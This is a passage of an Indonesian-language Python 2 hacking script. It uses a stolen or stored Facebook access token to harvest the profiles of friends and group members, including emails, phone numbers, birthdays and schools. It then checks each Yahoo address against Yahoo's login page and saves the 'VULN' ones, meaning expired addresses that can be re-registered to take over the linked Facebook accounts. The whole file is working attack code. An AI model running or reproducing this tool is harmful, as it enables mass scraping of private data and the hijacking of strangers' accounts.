        menu()
    except requests.exceptions.ConnectionError:
        print '\x1b[1;96m[\xe2\x9c\x96] \x1b[1;91mTidak ada koneksi'
        keluar()
    except IOError:
        print '\x1b[1;96m[!] \x1b[1;91mError'
        raw_input('\n\x1b[1;96m[\x1b[1;97mKembali\x1b[1;96m]')
        menu()


def informasi():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()

    os.system('clear')
    print logo
    print 42 * '\x1b[1;96m='
    aid = raw_input('\x1b[1;96m[+] \x1b[1;93mMasukan ID/Nama\x1b[1;91m : \x1b[1;97m')
    jalan('\x1b[1;96m[\xe2\x9c\xba] \x1b[1;93mTunggu sebentar \x1b[1;97m...')
    r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
    cok = json.loads(r.text)
    for i in cok['data']:
        if aid in i['name'] or aid in i['id']:
            x = requests.get('https://graph.facebook.com/' + i['id'] + '?access_token=' + toket)
            z = json.loads(x.text)
            print 43 * '\x1b[1;96m='
            try:
                print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;93mNama\x1b[1;97m          : ' + z['name']
            except KeyError:
                print '\x1b[1;96m[?] \x1b[1;93mNama\x1b[1;97m          : \x1b[1;91mTidak ada'

            try:
                print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;93mID\x1b[1;97m            : ' + z['id']
            except KeyError:
                print '\x1b[1;96m[?] \x1b[1;93mID\x1b[1;97m            : \x1b[1;91mTidak ada'

            try:
                print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;93mEmail\x1b[1;97m         : ' + z['email']
            except KeyError:
                print '\x1b[1;96m[?] \x1b[1;93mEmail\x1b[1;97m         : \x1b[1;91mTidak ada'

            try:
                print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;93mNo HP\x1b[1;97m         : ' + z['mobile_phone']
            except KeyError:
                print '\x1b[1;96m[?] \x1b[1;93mNo HP\x1b[1;97m         : \x1b[1;91mTidak ada'

            try:
                print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;93mTempat tinggal\x1b[1;97m: ' + z['location']['name']
            except KeyError:
                print '\x1b[1;96m[?] \x1b[1;93mTempat tinggal\x1b[1;97m: \x1b[1;91mTidak ada'

            try:
                print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;93mTanggal lahir\x1b[1;97m : ' + z['birthday']
            except KeyError:
                print '\x1b[1;96m[?] \x1b[1;93mTanggal lahir\x1b[1;97m : \x1b[1;91mTidak ada'

            try:
                print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;93mSekolah\x1b[1;97m       : '
                for q in z['education']:
                    try:
                        print '\x1b[1;91m                   ~ \x1b[1;97m' + q['school']['name']
                    except KeyError:
                        print '\x1b[1;91m                   ~ \x1b[1;91mTidak ada'

            except KeyError:
                pass

            raw_input('\n\x1b[1;96m[\x1b[1;97mKembali\x1b[1;96m]')
            menu()
    else:
        print '\x1b[1;96m[\xe2\x9c\x96] \x1b[1;91mAkun tidak ditemukan'
        raw_input('\n\x1b[1;96m[\x1b[1;97mKembali\x1b[1;96m]')
        menu()


def yahoo():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()

    os.system('clear')
    print logo
    print 42 * '\x1b[1;96m='
    print '\x1b[1;97m1.\x1b[1;93m Clone dari daftar teman'
    print '\x1b[1;97m2.\x1b[1;93m Clone dari teman'
    print '\x1b[1;97m3.\x1b[1;93m Clone dari member group'
    print '\x1b[1;97m4.\x1b[1;93m Clone dari file'
    print '\n\x1b[1;91m0.\x1b[1;91m Kembali'
    clone()


def clone():
    embuh = raw_input('\n\x1b[1;97m >>> ')
    if embuh == '':
        print '\x1b[1;96m[!] \x1b[1;91mIsi yang benar'
    elif embuh == '1':
        clone_dari_daftar_teman()
    elif embuh == '2':
        clone_dari_teman()
    elif embuh == '3':
        clone_dari_member_group()
    elif embuh == '4':
        clone_dari_file()
    elif embuh == '0':
        menu()
    else:
        print '\x1b[1;96m[!] \x1b[1;91mIsi yang benar'


def clone_dari_daftar_teman():
    global toket
    os.system('reset')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token Invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()

    try:
        os.mkdir('out')
    except OSError:
        pass

    os.system('clear')
    print logo
    mpsh = []
    jml = 0
    print 42 * '\x1b[1;96m='
    jalan('\x1b[1;96m[\x1b[1;97m\xe2\x9c\xba\x1b[1;96m] \x1b[1;93mMengambil email \x1b[1;97m...')
    teman = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
    kimak = json.loads(teman.text)
    jalan('\x1b[1;96m[\x1b[1;97m\xe2\x9c\xba\x1b[1;96m] \x1b[1;93mStart \x1b[1;97m...')
    print '\x1b[1;96m[!] \x1b[1;93mStop CTRL+z'
    print 42 * '\x1b[1;96m='
    for w in kimak['data']:
        jml += 1
        mpsh.append(jml)
        id = w['id']
        nama = w['name']
        links = requests.get('https://graph.facebook.com/' + id + '?access_token=' + toket)
        z = json.loads(links.text)
        try:
            mail = z['email']
            yahoo = re.compile('@.*')
            otw = yahoo.search(mail).group()
            if 'yahoo.com' in otw:
                br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
                br._factory.is_html = True
                br.select_form(nr=0)
                br['username'] = mail
                klik = br.submit().read()
                jok = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
                try:
                    pek = jok.search(klik).group()
                except:
                    continue

                if '"messages.ERROR_INVALID_USERNAME">' in pek:
                    print '\x1b[1;96m[\xe2\x9c\x93] \x1b[1;92mVULN'
                    print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;97mID   \x1b[1;91m: \x1b[1;92m' + id
                    print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;97mEmail\x1b[1;91m: \x1b[1;92m' + mail
                    print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;97mNama \x1b[1;91m: \x1b[1;92m' + nama + '\n'
                    save = open('out/MailVuln.txt', 'a')
                    save.write('Nama : ' + nama + '\nID        : ' + id + '\nEmail  : ' + mail + '\n\n')
                    save.close()
                    berhasil.append(mail)
        except KeyError:
            pass

    print 42 * '\x1b[1;96m='
    print '\x1b[1;96m[\x1b[1;97m\xe2\x9c\x93\x1b[1;96m] \x1b[1;92mSelesai \x1b[1;97m....'
    print '\x1b[1;96m[+] \x1b[1;92mTotal \x1b[1;91m: \x1b[1;97m' + str(len(berhasil))
    print '\x1b[1;96m[+] \x1b[1;92mFile tersimpan \x1b[1;91m:\x1b[1;97m out/MailVuln.txt'
    raw_input('\n\x1b[1;96m[\x1b[1;97mKembali\x1b[1;96m]')
    menu()


def clone_dari_teman():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;96m[!] \x1b[1;91mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()

    try:
        os.mkdir('out')
    except OSError:
        pass

    os.system('clear')
    print logo
    mpsh = []
    jml = 0
    print 42 * '\x1b[1;96m='
    idt = raw_input('\x1b[1;96m[+] \x1b[1;93mMasukan ID teman \x1b[1;91m: \x1b[1;97m')
    try:
        jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
        op = json.loads(jok.text)
        print '\x1b[1;96m[\x1b[1;97m\xe2\x9c\x93\x1b[1;96m] \x1b[1;93mNama\x1b[1;91m :\x1b[1;97m ' + op['name']
    except KeyError:
        print '\x1b[1;96m[!] \x1b[1;91mTeman tidak ditemukan'
        raw_input('\n\x1b[1;96m[\x1b[1;97mKembali\x1b[1;96m]')
        menu()

    jalan('\x1b[1;96m[\xe2\x9c\xba] \x1b[1;93mMengambil email \x1b[1;97m...')
    teman = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
    kimak = json.loads(teman.text)
    jalan('\x1b[1;96m[\xe2\x9c\xba] \x1b[1;93mStart \x1b[1;97m...')
    print '\x1b[1;96m[!] \x1b[1;93mStop CTRL+z'
    print 43 * '\x1b[1;96m='
    for w in kimak['data']:
        jml += 1
        mpsh.append(jml)
        id = w['id']
        nama = w['name']
        links = requests.get('https://graph.facebook.com/' + id + '?access_token=' + toket)
        z = json.loads(links.text)
        try:
            mail = z['email']
            yahoo = re.compile('@.*')
            otw = yahoo.search(mail).group()
            if 'yahoo.com' in otw:
                br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
                br._factory.is_html = True
                br.select_form(nr=0)
                br['username'] = mail
                klik = br.submit().read()
                jok = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
                try:
                    pek = jok.search(klik).group()
                except:
                    continue

                if '"messages.ERROR_INVALID_USERNAME">' in pek:
                    print '\x1b[1;96m[\xe2\x9c\x93] \x1b[1;92mVULN'
                    print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;97mID   \x1b[1;91m: \x1b[1;92m' + id
                    print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;97mEmail\x1b[1;91m: \x1b[1;92m' + mail
                    print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;97mNama \x1b[1;91m: \x1b[1;92m' + nama
                    save = open('out/TemanMailVuln.txt', 'a')
                    save.write('Nama : ' + nama + '\nID        : ' + id + '\nEmail  : ' + mail + '\n\n')
                    save.close()
                    berhasil.append(mail)
        except KeyError:
            pass

    print 42 * '\x1b[1;96m='
    print '\x1b[1;96m[\x1b[1;97m\xe2\x9c\x93\x1b[1;96m] \x1b[1;92mSelesai \x1b[1;97m....'
    print '\x1b[1;96m[+] \x1b[1;92mTotal \x1b[1;91m: \x1b[1;97m' + str(len(berhasil))
    print '\x1b[1;96m[+] \x1b[1;92mFile tersimpan \x1b[1;91m:\x1b[1;97m out/TemanMailVuln.txt'
    raw_input('\n\x1b[1;96m[\x1b[1;97mKembali\x1b[1;96m]')
    menu()


def clone_dari_member_group():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;96m[!] \x1b[1;91mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()

    try:
        os.mkdir('out')
    except OSError:
        pass

    os.system('clear')
    print logo
    mpsh = []
    jml = 0
    print 42 * '\x1b[1;96m='
    id = raw_input('\x1b[1;96m[+] \x1b[1;93mMasukan ID group \x1b[1;91m:\x1b[1;97m ')
    try:
        r = requests.get('https://graph.facebook.com/group/?id=' + id + '&access_token=' + toket)
        asw = json.loads(r.text)
        print '\x1b[1;96m[\x1b[1;97m\xe2\x9c\x93\x1b[1;96m] \x1b[1;93mNama group \x1b[1;91m:\x1b[1;97m ' + asw['name']
    except KeyError:
        print '\x1b[1;96m[!] \x1b[1;91mGroup tidak ditemukan'
        raw_input('\n\x1b[1;96m[\x1b[1;97mKembali\x1b[1;96m]')
        menu()

    jalan('\x1b[1;96m[\xe2\x9c\xba] \x1b[1;93mMengambil email \x1b[1;97m...')
    teman = requests.get('https://graph.facebook.com/' + id + '/members?fields=name,id&limit=999999999&access_token=' + toket)
    kimak = json.loads(teman.text)
    jalan('\x1b[1;96m[\xe2\x9c\xba] \x1b[1;93mStart \x1b[1;97m...')
    print '\x1b[1;96m[!] \x1b[1;93mStop CTRL+z'
    print 42 * '\x1b[1;96m='
    for w in kimak['data']:
        jml += 1
        mpsh.append(jml)
        id = w['id']
        nama = w['name']
        links = requests.get('https://graph.facebook.com/' + id + '?access_token=' + toket)
        z = json.loads(links.text)
        try:
            mail = z['email']
            yahoo = re.compile('@.*')
            otw = yahoo.search(mail).group()
            if 'yahoo.com' in otw:
                br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
                br._factory.is_html = True
                br.select_form(nr=0)
                br['username'] = mail
                klik = br.submit().read()
                jok = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
                try:
                    pek = jok.search(klik).group()
                except:
                    continue

                if '"messages.ERROR_INVALID_USERNAME">' in pek:
                    print '\x1b[1;96m[\xe2\x9c\x93] \x1b[1;92mVULN'
                    print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;97mID   \x1b[1;91m: \x1b[1;92m' + id
                    print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;97mEmail\x1b[1;91m: \x1b[1;92m' + mail
                    print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;97mNama \x1b[1;91m: \x1b[1;92m' + nama
                    save = open('out/GrupMailVuln.txt', 'a')
                    save.write('Nama : ' + nama + '\nID        : ' + id + '\nEmail  : ' + mail + '\n\n')
                    save.close()
                    berhasil.append(mail)
        except KeyError:
            pass

    print 42 * '\x1b[1;96m='
    print '\x1b[1;96m[\x1b[1;97m\xe2\x9c\x93\x1b[1;96m] \x1b[1;92mSelesai \x1b[1;97m....'
    print '\x1b[1;96m[+] \x1b[1;92mTotal \x1b[1;91m: \x1b[1;97m' + str(len(berhasil))
    print '\x1b[1;96m[+] \x1b[1;92mFile tersimpan \x1b[1;91m:\x1b[1;97m out/GrupMailVuln.txt'
    raw_input('\n\x1b[1;96m[\x1b[1;97mKembali\x1b[1;96m]')
    menu()


def clone_dari_file():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;96m[!] \x1b[1;91mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()

    try:
        os.mkdir('out')
    except OSError:
        pass

    os.system('clear')
    print logo
    print 42 * '\x1b[1;96m='
    files = raw_input('\x1b[1;96m[+] \x1b[1;93mNama File \x1b[1;91m: \x1b[1;97m')
    try:
        total = open(files, 'r')
        mail = total.readlines()
    except IOError:
        print '\x1b[1;96m[!] \x1b[1;91mFile tidak ditemukan'
        raw_input('\n\x1b[1;96m[\x1b[1;97mKembali\x1b[1;96m]')
        menu()

    mpsh = []
    jml = 0
    jalan('\x1b[1;96m[\xe2\x9c\xba] \x1b[1;93mStart \x1b[1;97m...')
    print '\x1b[1;96m[!] \x1b[1;93mStop CTRL+z'
    print 42 * '\x1b[1;96m='
    mail = open(files, 'r').readlines()
    for pw in mail:
        mail = pw.replace('\n', '')
        jml += 1
        mpsh.append(jml)
        yahoo = re.compile('@.*')
        otw = yahoo.search(mail).group()
        if 'yahoo.com' in otw:
            br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
            br._factory.is_html = True
            br.select_form(nr=0)
            br['username'] = mail
            klik = br.submit().read()
            jok = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
            try:
                pek = jok.search(klik).group()
            except:
                continue

            if '"messages.ERROR_INVALID_USERNAME">' in pek:
                print '\x1b[1;96m[\xe2\x9c\x93] \x1b[1;92mVULN'
                print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;97mEmail\x1b[1;91m: \x1b[1;92m' + mail
                save = open('out/MailVuln.txt', 'a')
                save.write('Email: ' + mail + '\n\n')
                save.close()
                berhasil.append(mail)

    print 42 * '\x1b[1;96m='
    print '\x1b[1;96m[\x1b[1;97m\xe2\x9c\x93\x1b[1;96m] \x1b[1;92mSelesai \x1b[1;97m....'
    print '\x1b[1;96m[+] \x1b[1;92mTotal \x1b[1;91m: \x1b[1;97m' + str(len(berhasil))
    print '\x1b[1;96m[+] \x1b[1;92mFile Tersimpan \x1b[1;91m:\x1b[1;97m out/FileMailVuln.txt'
    raw_input('\n\x1b[1;96m[\x1b[1;97mKembali\x1b[1;96m]')
    menu()


if __name__ == '__main__':
    menu()
    masuk()